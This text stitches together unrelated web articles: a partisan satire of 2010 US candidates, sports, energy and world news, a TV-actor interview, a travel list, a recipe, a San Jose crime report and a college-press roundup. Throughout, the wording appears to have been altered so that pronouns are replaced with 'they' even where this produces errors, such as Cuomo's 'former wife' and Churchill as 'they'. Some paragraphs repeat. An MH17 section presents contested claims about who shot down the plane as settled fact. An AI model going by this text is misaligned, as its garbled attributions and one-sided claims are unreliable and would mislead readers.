Paladino really is the whole package. A family values maven who fathered a daughter with someone not their wife, they threatened to “take out” a New York Post reporter (for being a biased liberal…at a publication owned by Rupert Murdoch) and told anyone who'd listen that their opponent, Attorney General Andrew Cuomo, had an affair while married to their former wife - without any proof to back up this claim, of course.
Paladino also just hates the government, except when it's giving them taxpayer money hand-over-fist, in the form of Empire Zone tax credits to ostensibly create jobs - which they then mostly pocketed, just for the hell of it. Yes, a modern day Robespierre is he.
Meanwhile, in South Carolina, Democrats, trying to defeat Tea-Party-tart Senator Jim DeMint, somehow nominated Alvin Greene. In August, to quote from The Huffington Post, a “grand jury indicted Greene, 32, for disseminating, procuring or promoting obscenity – a felony – as well as a misdemeanour charge of communicating obscene materials to a person without consent.” Basically, in that known prime pickup spot - inside a college computer lab - Greene thought it wise to show pornographic material to a young lady who unsurprisingly was uninterested. They have since said they were “joking,” which simply means they joke the way Billy Joel drives.
Yet, somehow Palmetto State Democrats thought it wise to pick this guy - albeit before the obscenity charge, but also before anyone knew who they were as they had no website, staff, or fund raising operation - over a former judge and lawmaker to be their guy to go after the demented DeMint. Hats off, well played.
Now, it's necessary to stop here and note something important. I have chosen to single out one looney-tunes Democrat and one ribald Republican, not to imply equal responsibility, but simply to show how widespread is the insanity. I do not operate under the faux-balance of many in the US media, where perfectly smart people pretend that 50% of all bad things are Republican, while 50% are Democratic.
In fact, if I were to assign blame for the crazy that has invaded the current US political system - keeping in mind everyone from the Tea Party to Todd Palin - I'd probably feel comfortable assigning about 86.45% to Republicans, 11% to Democrats and 2.55% to Lady Gaga. But that's just a rough estimate, mind you.
And when you start looking at more and more of the Republicans currently running for office, it can begin to even feel a tad generous. How often do you get the former CEO (Linda McMahon of Connecticut) of the World Wrestling Entertainment (WWE) running for the US Senate? For the uninitiated, the WWE is the high school dropout's ballet, where Americans pay perfectly good dollar bills to watch half-naked, grown men with the disposition of Carl Paladino pretend to fight, while cutting themselves with razor blades so that it appears more “real.”
The WWE has also functioned as a drug cartel, funnelling steroids to their wrestlers so they could appear ever-more Schwazerneggerian (another Republican). McMahon and their husband Vince even got involved in the clown show, simulating emotional and physical abuse onstage, as well as theirs committing adultery while they helplessly watched in a comatose state.
It's like a Saturday night at Mel Gibson's house!
But even that, apparently, wasn't “entertaining” enough. So they decided to send their daughter Stephanie onstage and simulate their rape. Yes, you read that right. Linda McMahon, for money, had men simulate the rape of their daughter in front of a crowd of screaming, inebriated, 50-inch-waist men. Well, geez, I sure hope if they win she'll get to Chair the Senate Judiciary Committee.
This, my friends, is only a taste of the tottering truculents running for higher office in America this year. And with a media establishment that's in love with political soap opera, a political party (the Republicans) that has come to think of George W. Bush as a dirty liberal, and a Supreme Court that has said it's perfectly consistent with democracy for any overcompensated, inane individual to dump a billion dollars into a race for town clerk - politics in America should continue to be the provenance of the soulless and shirtless for some time to come.
Winston Churchill once famously said that, “democracy is the worst form of government, except for all the others.” Yet, one perhaps imagines that had Sir Winston seen 21st Century American democracy in action, they wouldn't have been so hard on all the others.

The San Francisco 49ers will reduce their 90-man roster to 75 players on Tuesday, making tonight's game crucial for those on the bubble.
Players will have the chance to showcase their skills in a preseason tilt with the Minnesota Vikings at Candlestick Park at 5 p.m. on NBC. Here's a look at a few of the position battles:
Quarterback
Colin Kaepernick and B.J. Daniels are safe. Struggling veterans Colt McCoy and Scott Tolzien are not, especially now that Eric Mangini-favorite Seneca Wallace is in town.
McCoy and Tolzien must be efficient and lead touchdown scoring drives to convince the coaching staff to keep them around. Wallace's signing and versatile skill set are indicative of the type of quarterback the 49ers are looking for.
Running back
It's probably just for a practice squad spot, but sophomore Jewell Hampton and rookie D.J. Harper are battling for it.
Hampton has leverage entering their second year with the team and proving they could handle the rock last week. Harper is versatile and a good pass protector, but a lost fumble against the Broncos doesn't look good.
Wide receiver
Since last week's game at Kansas City, A.J. Jenkins was dealt to the Chiefs for Jon Baldwin and Ricardo Lockette has been cut.
All eyes will be on Baldwin, who should make the team along with Anquan Boldin, Marlon Moore, Kyle Williams and Quinton Patton. Chuck Jacobs has all but earned a practice squad spot, meaning veterans Austin Collie, Lavelle Hawkins, Kassim Osgood, and Chad Hall are battling for a possible sixth receiver spot.
Tight end
Vernon Davis and Vance McDonald are locks, but last year's No. 3 Garrett Celek could be on the way out with the ascent of multi-talented rookie MarQueis Gray, the converted college quarterback and wide receiver who is also a logical candidate to serve as an emergency in-game signal caller.
Nose tackle
Ian Williams has emerged as the starter throughout camp and preseason. Paying Glenn Dorsey $3 million to be a backup and rotational player doesn't seem quite right.
Practice squad veteran Lamar Divens is next on the depth chart, but rookie Mike Purcell has looked good in both preseason games and can further their case Sunday night.
Linebackers
With four All Pro's and five very good backups, the 49ers have the best linebacking corps in the league, bar none.
Keeping a tenth on the active roster may be a stretch, but Nate Stupar has been stellar this preseason as they battle practice squad veteran Joe Holland, 2012 seventh-rounder Cam Johnson, and rookie Travis Johnson for a job.
Specialists
Yes it's true:The competition is even between Pro Bowl long snapper Brian Jennings and rookie challenger Kevin McDermott.
Math may also play a role here as Jennings is scheduled to make $940,000 this season while McDermott would earn $405,000 if they make the roster.
All-Pro punter Andy Lee is safe, but rookie Colton Schmidt does make carrying three legs with kicker Phil Dawson an intriguing option, given their ability to seemingly win the team field position on every punt and kickoff.

Though every day in 2017 feels like a week, it has only been four days since Kellyanne Conway, Donald Trump's flaxen-haired special adviser, showed their ass on national television by fabricating the “Bowling Green Massacre,” an event that did not happen, in order to justify the president's Muslim ban. And now, they would like you to know that she's sorry. Truly. They are!! Ugh.
In an interview with CNN's Jake Tapper and their well-honed “are you fucking kidding me” face, Conway addressed the false claims of a masscare that never was, admitting that they were sorry about what they said, but only kinda.
“I felt really badly about that. I apologize and I rectified. I'm very happy to have raised awareness,” they said, before noting that on Friday, their twisting of the truth to fit a terrifying agenda caused a three-year old article about Bowling Green to trend on ABC's website, most likely because people were looking it up in order to ascertain for themselves that they were talking about something that never happened.
“You cited a massacre that didn't happen, you said the media didn't cover it,” Jake Tapper said.

“What I meant is that the media didn't cover the masterminds,” they retorted. (In case you're wondering, they did.)
Admirable for only how many words they can say without seeming to take a breath, they continued, saying “We have a very high respect for the truth, and I can only speak for me, but I'm sorry that we misspoke.” They were also quick to clarify that they aren't trying to get people to believe something that didn't happen, despite the fact that the Bowling Green “Massacre” has been referred to numerous times as if it were cold, hard irrefutable fact and not something that they made up while gargling Diet Coke at 5 A.M. after an hour's worth of restless, fitful slumber.
“I have a high regard for the facts, but I want you to see some of the other facts that we're doing,” they said. Facts—you do them. That's how they work! Jake Tapper's face speaks volumes, louder than the squeak emitted from the wheels in Conway's head, greased for speed and spinning in vain.

The euro zone is sending its products around the world at a rate never seen before.
Its trade surplus hit a record €22.4 billion ($25.3 billion) in July.
A major reason for those surging exports has been the sagging euro. Thanks to the European Central Bank's bond-buying program and the euro zone's weak economic growth, the euro has been falling against the currencies of its major trading partners—the US, China, and Switzerland—since 2013.
Booming exports may seem like a reason for celebration (especially in Germany), but there are some dark clouds on the horizon. Although the recovering US buys more than twice as much of Europe's exports as China, the latter still accounted for about 10% of outgoing shipments during the first half of the year. It's a figure that's bound to start shrinking. In general, China's slowdown continues to loom large in the financial world:
Coal could overtake oil as the world's main fossil fuel by 2017
Follow > Disable alert for Paris Disable alert for Maria van der Hoeven Disable alert for International Energy Agency Follow >
Coal will nearly overtake oil as the dominant energy source by 2017, and only a drop in world gas prices could curb the use of the dirtier fossil fuel in the absence of high carbon prices, the International Energy Agency (IEA) said.
The IEA, the energy agency for developed countries, said earlier this year that without a major shift away from coal, average global temperatures could rise by 6 degrees Celsius by 2050, leading to devastating climate change.
China will use more coal than the rest of the world put together, while India will overtake the US as the world's second-largest consumer and become the biggest global importer, the Paris-based IEA forecast in its annual Medium-Term Coal Market Report.
“Coal's share of the global energy mix continues to grow each year, and if no changes are made to current policies, coal will catch oil within a decade," IEA executive director Maria van der Hoeven said in a statement. Use of the highly-polluting fossil fuel has surged in the past decade, mainly because of stronger demand from China and India, where cheap coal-fired electricity has helped to drive breakneck economic growth.
Coal now accounts for 28 per cent of total primary energy consumption, and demand for the fossil fuel rose 4.3 per cent in 2011 compared with 2010, the report said, underlining the world's continued addiction to a fuel source that helped turn the wheels of the 19th century industrial revolution.
The world will burn around 1.2 billion more tonnes of coal per year by 2017 than it does today, which equals the current coal consumption of Russia and the UScombined, the IEA chief said.
Global coal consumption is likely to reach 4.32 billion tonnes of oil equivalent (btoe) by 2017, compared with 4.4 btoe for oil, although the pace of growth is likely to be slower than over the past decade, the IEA forecast. Growth in coal use in developing countries will grow 3.9 per cent a year on average over the next five years if economies such as China return to previous patterns of economic growth, the report said, while coal use in developed nations would only fall 0.7 per cent by 2017.
In a sea of bad teases and fake-outs, Justin Theroux explains how "The Leftovers" became the one show to handle on-screen death perfectly.
For all the recent distress over who's alive and who's dead on TV, one series managed to pull off an on-screen death that made everyone happy.
No, they didn't actually die.
Well, they did, but only briefly.
Okay, it was eight hours and someone buried him, but he's alive now.
We think.
Even though Kevin's astounding journey in the final four episodes of “The Leftovers” Season 2 is complicated, it absolutely works. As portrayed by Justin Theroux and written by Damon Lindelof and Tom Perrotta, Kevin's deaths were based in character rather than implemented as a cheap plot device — or, in Theroux's words, “It served a higher purpose.”
Theroux, the de facto lead of Lindelof's HBO drama (now shooting its third and final season), recently spoke with Indiewire on their day off, extolling thoughts on Kevin's impossible arc performed so precisely, and why it stands as one of the few on-screen deaths that actually satisfied everyone.
Lately, fans have been getting angry if they feel tricked or lied to about on-screen death, like with “Game of Thrones” or “The Walking Dead.” What's kind of amazing is that there were never any complaints throughout this arc for Kevin; about them dying and coming back — twice.
I think audiences are obviously very savvy and they know when they're being “Who shot J.R.?”-ed in a show. So they know when they're basically being tricked into tuning in again. And I don't think this was that at all. Most of the time when people die, you don't go to the other side with them. They sort of just die, and then you realize, “Oh, they fell down the staircase but they didn't break their neck.” — whatever it is. This was not a soap opera death. You actually travel with them to the next place. I'm sure it's been done before, but not the way we did it.
No.
So I think that's why people embraced it. Because yeah, there's obviously going to be a reaction when a character dies on a television show, and I think we probably had a week of, “Oh, boy. What was that about?” But I think the minute the next episode came when I was obviously in this hotel, people went, “Oh, this wasn't just a device. This actually served a higher purpose.”
After Episode 7, did you feel any pressure via social media or otherwise to reassure fans or explain what was happening? To confirm you weren't gone for good, perhaps?
I love that you can surprise people. I had no inclination to tell people, “Oh, don't worry. It's going to be okay.” That's revealing the magic trick, you know? And also, I'm kind of a believer in not explaining things to people. That's partly from working with David Lynch, learning that even after the fact you can ruin the experience by explaining to people what happens. It's much more fulfilling to let people have their own reactions and sit with it. And with our show in particular, a lot of people had very violent reactions to it that are not favorable, that made them click off, and that's fine, too.
Did you always know it wasn't the end for Kevin? Did you know where it was going?
No, I didn't know where it was going. For that particular episode, the one where they drink the poison, it's scripted where he's dead. “Dead.” Really dead. So I called up Damon [Lindelof] after reading the script — and I was kind of ambivalent about it — but I asked, “Am I really dead?” And they said, “No, you're not. There's going to be a whole other thing that happens. You're not off the show.” They didn't tell me what form that was going to take until I got the next script.
So what was your first reaction to “International Assassin”?
About 10 pages in, I realized he, Tom and the other writers had picked up a big bat to swing, and I was like, “Oh, my God. That's an incredible script.” I was very touched by the script. I just thought it was such a gorgeous script, I was weeping by the end of it. I thought the Patti arc was so elegant and beautifully laid out. I didn't know how I was going to come out of it — crawling out of the ground — but to me the episode ended when Patti died, and crawling out of the ground was just to get me back in it.
The real feat, I thought, was the way they made such a great villain relatable. It's kind of reverse storytelling. If it was a comic book, they'd be like, “Here's the horrible thing that happened to the bad guy when they were a kid and that's why they want to kill people.” They did it in an incredibly original way — basically establishing them as bad made people accept that and then, in the last moments, they tell this story about “Jeopardy!” of all things. Immediately, you just have this flood of compassion for them — at least I did. Her, as a person, saying, “I won all this money, but I couldn't leave my abusive husband” — how they wasted their life. It's just a beautiful piece of writing.
Did shooting that episode feel different while you were in it?
Yes, and the most special part about it was that the writers got to write that script. I still got to play Kevin Garvey, it was just a demented, James Bond, burdened version of him. [laughs] It was cool in that I had this skill set that I don't really have in life. It has this sort of dream logic where, yes, if a bellhop bursts into my room and tries to stab me to death, all of a sudden I'm a great fighter. But again, the character still remained the same which was what was so impressive about the script. I knew there was a high bar for failure if we didn't do it correctly. So I think we all really worked extra hard on it to try to service what had been given to us.

Turkmenistan's President Gurbanguly Berdymukhammedov says they are stepping down as leader of the ruling party to promote a multiparty system.
Berdymukhammedov told a party conference on August 17 that, in a multiparty system, "the president of a country should not be a member of any party."
Berdymukhammedov has led the Democratic Party since 2006, taking over after the death of Saparmurat Niyazov, their predecessor as president and party leader.
Formerly the Turkmen branch of the Soviet Communist Party, it was the country's only party for two decades.
Last year, a new law authorized the creation of a new political party called the Party of Industrialists and Entrepreneurs.
The Democratic Party has some 190,000 members, the Party of Industrialists and Entrepreneurs around 2,000.
Both parties are set to contest parliamentary elections in December.

Once rejected as the sport of millionaires by Mao, China now says there is is ‘no right or wrong' about playing golf
Teeing off is not a crime, the Communist party of China has decreed, lifting millions of fairway fanatics out of the rough.
Banned by Mao Zedong – who despised the “sport for millionaires” – golf enjoyed a renaissance during the 80s and 90s only to be outlawed for the party's 85 million members in 2015 as a result of president Xi Jinping's anti-corruption drive.
Articles in the party-controlled media have painted China's golf courses as cauldrons of profiteering where the palms of rotten officials are greased by favour-seeking business people.
“The golf course is gradually changing into a muddy field where they trade money for power,” one state-run newspaper complained in 2015.
Party leaders appeared to step back from their condemnation of the game this week.
“Since it is only a sport, there is no right or wrong about playing golf,” an article in the Discipline Inspection and Supervision News, the official newspaper of China's anti-corruption agency, declared.
The newspaper pointed to article 87 of the Communist party's disciplinary regulations which deals with potential punishments for the illicit possession of golf membership cards.
“Can officials play golf while the nation steps up efforts to clamp down on corruption and promote austerity?” the China Daily asked. “The answer is yes - if they pay out of their own pockets.”
“Playing golf itself is not a wrongdoing,” the newspaper confirmed.
A report in the Global Times tabloid suggested the Communist party continued to harbour serious reservations about golf.
Su Wei, an academic at a school for Communist party cadres in Chongqing, told the newspaper Chinese golf course had become “an arena for corruption” where bribes were routinely offered to government officials.
Golf loses its gloss for China's privileged elite Read more
“Golf can satisfy some officials' vanity, corrupting their lifestyle, which can lead to damage to the Party's image and the erosion of officials' ability to serve,” Su was quoted sa saying.
China's burgeoning golfing community is one of many to have been affected by president Xi's bid to eradicate corruption.
Since they came to power some of the party's most powerful figures have been thrown into jail including former security chief Zhou Yongkang and some of the most senior members of the People's Liberation Army.
Speaking in January Xi used words straight from the clubhouse to announce their determination to cleanse China's government.
“To forge iron,” they said, “one must be strong.”
The French military rolls out its big guns every July 14 for Bastille Day, with military parades and air shows as everyone else takes to the streets to watch. There are fireworks, of course â what national celebration would be complete without them?
Mexico's Independence Day is best celebrated in Mexico City, where hundreds of thousands gather in the Zocalo, the main square, to chant patriotic slogans and - you guessed it - watch a fireworks display.
Saint Paddy's Day has nothing to do with Irish independence, but it does have a lot to do with national culture and pride, and even more to do with taking to the streets in the name of having a good time.
Everyone knows what happens on US Independence Day: flags are flown, meat is barbecued, allegiance is sworn, beers are drunk, picnics are had, and then aliens attack and Will Smith saves the day.
National celebrations around the world are an excuse take the day off work, eat good food, spend time with loved ones and get drunk in the name of patriotism.
Here are some of the best national celebrations around the world that travellers are welcome to crash.
St Patrick's Day, Ireland (March 17)
Saint Paddy's Day has nothing to do with Irish independence, but it does have a lot to do with national culture and pride, and even more to do with taking to the streets in the name of having a good time. St Patrick's Day in Ireland is one of those bucket list events for travellers, the chance to join in a raucous national celebration of all that's good about the country, including silly hats and a pint of green beer. Or two.
Fiestas Patrias, Peru (June 24, July 28-29)
Peru celebrates its statehood on three separate occasions throughout the year. The first day is a nod to farmers and rural dwellers, while July 28 marks the day Jose de San Martin proclaimed independence for the country, and July 29 is a celebration for the armed forces. All dates are marked with the appropriate festive gusto.
US Independence Day (July 4)
Everyone knows what happens on US Independence Day: flags are flown, meat is barbecued, allegiance is sworn, beers are drunk, picnics are had, and then aliens attack and Will Smith saves the day. Movies aside, this really is a great time to be in the USA, as everyone comes out to celebrate, and you'll see more stars and stripes than you ever thought possible. No one does patriotism quite like the Americans.
Bastille Day, France (July 14)
Well, maybe no one but the French. To celebrate the storming of the Bastille in 1789, the French military rolls out its big guns every July 14, with military parades and air shows as everyone else takes to the streets to watch. There are fireworks, of course – what national celebration would be complete without them? There are also, curiously, public parties held in fire stations, hosted by the fire-fighters themselves, which is great news for anyone whose house isn't on fire that day.
Bolivian Independence Day (August 6)
You think we're bad. I've been in La Paz for Bolivian Independence Day, and I've never seen drunker people in my entire life. Bolivians go nuts for their national celebration, taking to the streets in the morning for a series of parades, before taking to the local establishments in the evening for the consumption of heroic amounts of booze. All foreign (non-Chilean) guests appear to be welcomed with open arms.
India Independence Day (August 15)
There's pomp, there's ceremony, and then there's Indian pomp and ceremony, which takes things to a while new level. For evidence, head to Delhi on August 15 and watch the locals mark their independence from the British Empire. It's customary for houses, and those houses' inhabitants, to be decked in the national colours as parades and ceremonies occur throughout the country. Bring your camera.
Indonesian Independence Day (August 17)
What better way to celebrate the independence of your country from the dastardly Dutch than by attempting to climb up a huge greasy pole and grab the prizes affixed to the top? It's called "panjat pinang", and it's meant to symbolise Indonesia's struggle to go it alone. OK. It's also about as visually interesting a way to celebrate national pride as I've ever seen.
Mexican Independence Day (September 16)
Contrary to what some might think, given the way it's celebrated in the US, Cinco de Mayo is not Mexico's day of independence. That date falls later in the year, in September, to mark the beginning of the Mexican War of Independence. This is best celebrated in Mexico City, where hundreds of thousands gather in the Zocalo, the main square, to chant patriotic slogans and – you guessed it – watch a fireworks display.
What is your favourite day of national celebration?

With the recent shooting down of a Malaysian Boeing 777 over Ukraine, the Western media is aflame with fingerpointing at Russia and Ukrainian separatists. However, while NATO and its media mouthpieces attempt to rekindle the Cold War and ignite a confrontation with Russia, there exists a number of fundamental questions surrounding the events that have taken place in Eastern Ukraine.
Although not a detailed list, below are six reasons why one should question the official story of the Malaysian flight shot down over Ukraine.
1.) The Ukrainian separatists do not have the military hardware capable of shooting down an airplane at the height at which the Malaysian Boeing 777 was flying.
Ukrainian separatists are equipped with shoulder-fired anti-aircraft missiles which are capable of bringing down an airplane. This much is true. However, the systems believed to be possessed by the separatists are those such as the Igla missile system, which is incapable of hitting planes at the altitudes at which the Malaysian flight was flying. 33,000 feet is simply too high an altitude to be reached with the shoulder-fired missile delivery systems with which the Ukrainian separatists are currently outfitted.
There is no evidence to suggest that the separatists possess the BUK missile systems. At the time of the writing, this writer is not aware of any reports suggesting that separatists commandeered BUK missile launching systems from the Kiev fascist government forces; the only way they could have acquired them unless given the BUK by Russia, which itself is highly unlikely given Russian strategic concerns.
2.) The Kiev forces do have the BUK missile launching system.
While separatist forces are not known to possess missile systems as advanced as the BUK system, the Kiev forces most certainly do.
The BUK system, which requires transportation and mounting on a tracked vehicle or large truck, is not likely to be in the hands of rebels surviving on Russian small arms and other basic forms of military and tactical aid. BUK is much more the type of system that would be property of a national government.
If the Malaysian plane was shot down using the BUK system, it is the Kiev military forces that should immediately be investigated.
3.) Kiev moved its BUK system to the Donetsk area the day before
Reports emerging from Russian news agencies like ITAR-TASS suggest that the Kiev military moved its BUK missile systems into the area surrounding Donetsk on Wednesday, one day before the Malaysian flight was shot down allegedly using that very missile launching system.

The fact that the type of missiles allegedly used to shoot down the Malaysian flight were not only possessed by the Ukrainian military but moved to the very region and area where the shootdown occurred implicates the Kiev forces vastly more than it does the Russians or the Ukrainian separatists.
4.) The questions surrounding why the Malaysian flight was flying over the area to begin with.
As reported by The Atlantic, the Federal Aviation Administration placed an order prohibiting “American pilots, airlines, charter carriers, and everyone else over whom the FAA has direct jurisdiction, from flying over parts of Ukraine” nearly three months ago.
This flight prohibition clearly demonstrates that aviation authorities fully understood that this particular flight path was over a dangerous area. So why was the Malaysian flight flying over this area to begin with?
5.) The timing of the event.
The shooting down of the Malaysian flight conveniently comes only a day after claims by the Ukrainian military that Russia shot down a Ukrainian jet fighter over Ukrainian territory.
It also comes only days after the Western media seized on reports suggesting that the Russian government was considering targeted strikes inside Ukraine in order to protect the Ukrainian people, ethnic Russians, and Russian interests.

SB Nation video archives: How the Warriors built an NBA champion (2015)
In order to stay on track with one of my goals I have prepped some foods including cutting up vegetables, bagging snacks in appropriate portions, and preparing my lunch for tomorrow. In the past I have found the most success on not going out to eat by preparing a meal plan and pre-making as much of my food as possible. You can find recipes for this weeks meal plan here.
I had a long night at the gym so I was a little short on time but I was able to whip together this quick and easy gluten-free turkey wrap for tomorrow's lunch weighing in at less than 300 calories per serving! I have mine chilling in the fridge; ready for me to take to work tomorrow.
Note* – I recently found out this particular wrap is not gluten-free. Sorry for the misinformation! If you would like a gluten-free option. Rudi's makes a gluten-free spinach tortilla.
Ingredients
1 sheet California Lavash spinach wrap (Again, if you would like a gluten-free option. Rudi's makes a gluten-free spinach tortilla.)
1 slice Boar's Head havarti w/jalapeno cream cheese
4 oz Boar's Head low sodium turkey breast
3 tbs Sabra roasted red pepper hummus
1-2 cups baby spinach (preference)
1/2 cup orange bell pepper
Directions
Lay wrap lengthwise horizontally in front of you. Spread hummus evenly across wrap. Layer on spinach, turkey, cheese and bell pepper. Roll wrap firmly up being careful not to tear the wrap. Slice completed wrap in half. Enjoy!

SAN JOSE — A man wanted in a fatal downtown San Jose shooting was caught after they successfully fled to Mexico, then apparently got in enough trouble there that Mexican authorities dropped them off at the California border, officials said.
What exactly 19-year-old Daniel Gebrehiwet Zeratsion did to attract the attention of Mexican law enforcement remains unclear. But they eluded capture for over a week until their run-in south of the border, leading to their arrest Tuesday in the shooting death of 20-year-old Marina resident Myla Thi Dang.
Dang died the afternoon of July 3 at a home on South 10th Street between Reed and Margaret streets on the southern edge of downtown San Jose, according to San Jose police. Officers were called to perform a welfare check after neighbors reported hearing “loud bangs” coming from the home, and found Dang inside suffering from at least one gunshot wound.
Early on in the investigation, homicide detectives identified Zeratsion, a San Jose resident, as a suspect in the shooting. Police said the suspect and victim knew each other, but did not elaborate on their relationship.
Police sent out a bulletin to state and federal law-enforcement agencies alerting them to a $2 million arrest warrant for Zeratsion.
There would be no sign of the suspect stateside until about 3:40 p.m. Tuesday, when Mexican police brought Zeratsion to the doorstep of the United States. More specifically, to U.S. Customs and Border Protection in southern San Diego.
“Mexico authorities turned over a man to CBP officers at the San Ysidro port of entry's PedWest facility,” agency spokesperson Jacqueline Wasiluk said in an email to this news organization.
The warrant for their arrest showed up in a records check after border agents received their identification information.
“The officer checked Zeratsion's name against law enforcement databases and was alerted that they were wanted,” Wasiluk said. “CBP officers later transported them to San Diego County Jail to await extradition.”
Zeratsion was in the San Diego Central Jail until Friday morning, when records show they were released to police custody. San Jose homicide detectives traveled to San Diego to secure their transport back to San Jose, which is expected by early next week barring any complications, Officer Albert Morales said.
Anyone with information about the case can contact SJPD homicide Detective Sgt. Mike Montonye or Detective Jason Tanner at 408-277-5283. Silicon Valley Crime Stoppers at 408-947-STOP or svcrimestoppers.org. Tipsters may be eligible for a cash reward.

An All-Female Board. The Cavalier Daily at the University of Virginia has elected an all-female managing board for the first time in its 126-year history. Incoming editor-in-chief Julia Horowitz: “I want to make sure that when news breaks two months from now, five months from now, 12 months from now that we have an institution there that can react … and that comes from being financially sustainable.” (The Cavalier Daily, University of Virginia)

“I'm in Paris, and I'd Be Lying if I Said I Wasn't Afraid.” Daily Collegian columnist and Penn State University Sierra Baldwin is studying in Paris right now. I words: “Two espressos and jet lag keep me wide awake quietly typing on my laptop well beyond midnight in this beautiful city. No one else in the apartment is awake, but the city is alive — full of the strength in unity that's been compared to Boston after the marathon bombings or New York City after Sept. 11, 2001. ‘Je suis Charlie' posters hang from apartment windows and balconies, and graffiti tells terrorists to go home. I'm in Paris, and I'd be lying if I said I wasn't afraid. …I am Charlie because I believe in the freedom of speech and feel for the victims and their families, but I am not Charlie because I don't believe newspapers should be used to put down religious practices.” (The Daily Collegian, Penn State University)

Boko Haram Media Blackout. An editorial in The Daily Targum at Rutgers University reminds readers that while Charlie Hebdo received tons of coverage, a separate, much larger international tragedy went almost unnoticed by the public and the press. As editors explain, “On January 3 of this year, two thousand Nigerian men, women and children were murdered. In the days that followed, while the world focused its attention on the Charlie Hebdo shootings, the victims of Boko Haram warfare went unnoticed. Comparing one tragedy to another would be an injustice to both acts of terrorism. However, the disproportionate media attention received by both these atrocities respectively cannot be ignored. … This Boko Haram incident is the most recent act of genocide in a string of terrorist attacks dating back to 2009. The lack of appropriate media attention attributed to Boko Haram may stem from the complexity and multifaceted nature of the issue. … [I]gnoring blatant terrorism further emphasizes the one-track mindedness of the 24-hour news cycle and its fundamental nature to resist complexity.” (The Daily Targum, Rutgers University)

“It's -30- for Printing Press.” The Daily Egyptian will no longer be published through its own on-campus printing press. A changing financial landscape has forced the Southern Illinois University Carbondale student newspaper to outsource its printing — ending a 47-year in-house print operation that was a rarity among student media nationwide. As the paper's editor-in-chief Sarah Gardner shares, “Being one of only a handful of college media organizations with a printing press has been a source of pride for the DE, the School of Journalism and the university itself. … When the DE asked for a student fee last year, and a group of professionals pooled their experience and expertise, one recommendation made was to outsource printing. In an effort to be conscious of our financial situation, we had no choice but to consider it. … We will not let it affect our coverage or quality. But we will not take the experience of printing in-house for the last time for granted.”

DJ Giggles. In a profile in The Beacon, University of Portland student radio station DJ Molly Steiner confessed their most embarrassing on-air moment — one they shared with their co-host Jackie Ott: “Our friends – when we first started the show – called us DJ Giggles because we couldn't figure out how to work anything, so we were just laughing. Literally, the first 10 minutes of our first show was just laughter, because we didn't know what we were doing. We couldn't figure out why the sound board wasn't working, so I sang ‘The Climb' to our audience of probably six listeners.” (The Beacon, University of Portland)

“An Open Letter to Taylor Swift.” Michigan Daily columnist Michael Schramm has penned an open letter to Taylor Swift asking them to put their music back on Spotify. “You're turning a blind eye to the reality that not all of your fans can afford a $12 album. To a celebrity in your financial standing, it may be difficult to envision, but trust me — it's a reality that many of us face. When you're poor, $12 can genuinely be the difference between whether you have enough grocery money for the week. … Taylor, I've been a fan of yours since I was 12 years old. I lay on my blue and yellow comforter listening to ‘Teardrops On My Guitar.' At 15, ‘You Belong With Me' became my anthem as I developed a crush on someone who didn't reciprocate the feeling. '22' became the jam that helped glue the highlights of a college road trip in my heart. So please, don't leave a blank space in my memories where 1989 should go.” (The Michigan Daily, University of Michigan)

“The Severity of Our Financial Situation.” At the University of Texas at Austin, Texas Student Media (TSM) — the organization that oversees Cactus Yearbook, Texas Travesty, Texas Student TV, KVRX 91.7 FM and The Daily Texan — is still financially floundering. Last spring, the Moody College of Communication at UT promised to help. Apparently, TSM is still waiting for that help. A Daily Texan editorial: “The way the funding is set up, it is likely that TSM won't see a single penny until this summer. That's about a year and a half after we were told by [an outgoing dean] that we were being thrown a much-needed lifeline. We appreciate the help and understand the challenges of securing money, especially in a bureaucracy like UT's. But the main point here is that the administration doesn't entirely seem to grasp the severity of our financial situation.” (The Daily Texan, UT Austin)

New ‘Prince' Team. To introduce themselves and the new editorial board, Daily Princetonian editor-in-chief Anna Mazarakis at Princeton University shared a smidgen about the ‘Prince' routine. As they write, “Every Sunday through Thursday from 4:30 p.m. to the early hours of the morning, editors and staffers are at work in our newsroom editing articles and photographs and laying out the paper. This follows work throughout the day outside the newsroom by our hardworking staff coordinating content, conducting interviews, taking photographs, writing articles, listening and paying attention to what is happening in the community.” (The Daily Princetonian, Princeton University)

Student Press History: Rachel Maddow Comes Out in the Campus Newspaper. In the early 1990s, MSNBC Host Rachel Maddow came out in The Stanford Daily student newspaper. It's an interesting saga, involving an open letter Maddow decided to write and post in their dorm as a first-year student in response to homophobic comments. According to the Daily article:
“Coming out has also been a positive experience for Maddow, who said they feel more comfortable and happy with themselves now. They said they have moved from vulnerable to confident, and that everything in their life is now more coherent. In the past, Maddow's homosexuality had been a barrier to close friendships, they said. To prevent people from realizing they were gay, Maddow shut themselves off from other people. Coming out has solidified Maddow's friendships, with both men and women. ‘I'm a lot closer to all my friends,' they said. ‘I don't feel like I've lost any friends.' Being friends with men is easier than ever, since ‘it's a total bonding experience,' Maddow said. ‘There's no tension, no pressure. It's wonderful.'”

“Pure Speculation Dressed Up With Buzzwords.” The Red & Black editorial board at the University of Georgia recently called out Fox News. The R&B crew criticized the conservative news channel for “an aggressive distortion of the facts” in its recent reporting of alleged “no-go zones” in Europe which supposedly operate under Islamic Sharia law free of government interference. As editors argue, “[W]hat Fox News offered up to viewers was pure speculation dressed up with buzzwords. It was called out on it in appropriate force, but the damage may already be done. Media shapes our perception of the world, and as a broadcast news outlet with a far, lasting reach, Fox News has a great deal of power in this capacity. It is the network's responsibility to fact-check for the public good.” (The Red & Black, University of Georgia)

“Explaining What a Podcast Is.” Columbia Spectator staffer William Steakin Jr. at Columbia University writes, “I am still surprised by the amount of time I spend explaining what a podcast is. … With an average download rate of 1.26 million per episode, ‘Serial' has quickly become the most popular podcast yet. And while I certainly enjoy ‘Serial,' I really do hope its popularity will lead to far fewer conversations explaining what the heck a podcast actually is.” (The Columbia Daily Spectator, Columbia University)

“Posts I've Shared in the Past.” University of Nebraska Lincoln Jazmin Turner has a confession. Recently, in their words, “I've been questioning my position on my social media pages.” As they confirm in an op-ed for The Daily Nebraskan, “I feel guilty to see all the posts I've shared in the past. That isn't who I am now and not how I want to be seen. I feel like starting my pages over so I wouldn't have anything on the sites that I didn't want, but I knew that process would be an effort. I also feel like deleting all my social media pages. I know that for some social media sites I wouldn't be able to do that because social media has become such a large part of the way we communicate with others that aren't frequently around us. However, I rarely speak to the 794 ‘friends' I have on Facebook. These people don't need to know my personal information, nor do I theirs.” (The Daily Nebraskan, University of Nebraska Lincoln)

